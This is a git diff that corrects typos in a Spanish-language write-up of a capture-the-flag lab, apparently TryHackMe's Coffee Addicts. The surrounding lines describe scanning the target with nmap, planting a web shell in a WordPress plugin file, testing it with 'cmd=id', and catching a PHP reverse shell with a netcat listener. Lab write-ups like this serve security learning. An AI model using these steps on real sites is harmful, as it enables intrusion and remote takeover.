@@ -44,7 +44,7 @@ Para identificar los puertos abiertos y los servicios que se están ejecutando e
 sudo nmap -sSVC -T4 -vvv 142.160.0.7 -oN Portscan.txt
 ```
 
-- `-sSCV`: Este conjunto combina tres funcionalidades clave:
+- `-sSVC`: Este conjunto combina tres funcionalidades clave:
 		`-sS`: SYN scan → Escaneo furtivo de puertos TCP.    
 		`-sV`: Version detection → Detección de versiones de servicios.    
 		`-sC`: Default scripts → Ejecución de los scripts NSE por defecto (los más comunes para enumeración básica).
@@ -142,7 +142,7 @@ Entonces con esto en cuenta aprovechamos esta funcionalidad para insertar un Web
 
 ![Descripción](/assets/img/posts/cofeeaddicts/20250622010801.png)
 
-Luego de inyectar el código acedemos a la siguiente URL, incorporando el parámetro `cmd=id`, con el objetivo de validar la ejecución:
+Luego de inyectar el código accedemos a la siguiente URL, incorporando el parámetro `cmd=id`, con el objetivo de validar la ejecución:
 
 ``` bash 
 http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php?cmd=id
@@ -165,7 +165,7 @@ $port = "1234"; // <- Puerto
 ![Descripción](/assets/img/posts/cofeeaddicts/20250622014542.png)
 
 Con esto cargado, colocamos nuestra maquina en escucha por el puerto 1234 : `nc -lvnp 1234`.
-Acedemos a la URL para ejecutar el payload: `http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php` y en nuestra maquina obtendremos la reverse shell:
+Accedemos a la URL para ejecutar el payload: `http://coffeeaddicts.thm/wordpress/wp-content/plugins/akismet/akismet.php` y en nuestra maquina obtendremos la reverse shell:
 
 ![Descripción](/assets/img/posts/cofeeaddicts/20250622014743.png)
 
